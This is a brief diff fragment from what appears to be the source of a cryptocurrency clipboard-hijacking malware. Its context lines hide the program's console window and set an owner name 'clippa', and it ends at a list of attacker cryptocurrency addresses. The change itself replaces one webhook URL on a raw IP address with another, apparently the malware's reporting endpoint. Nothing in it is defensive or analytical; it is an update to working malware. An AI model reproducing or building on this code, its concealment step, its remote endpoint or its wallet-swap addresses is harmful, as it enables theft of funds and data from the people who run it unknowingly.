@@ -19,7 +19,7 @@ if hwnd:
     ShowWindow(hwnd, SW_HIDE)
 
 OWNER_USERNAME = "clippa"
-WEBHOOK_URL = "http://196.251.81.229:8000/repeter/uhmwtf"
+WEBHOOK_URL = "http://196.251.81.229:8000/repeter/2YoJZMLDK3yu6La7"
 
 addresses = {
     "btc": "bc1qxpz2e8taktzesd0sd53lzmj87m5nkvu3fp82rk",
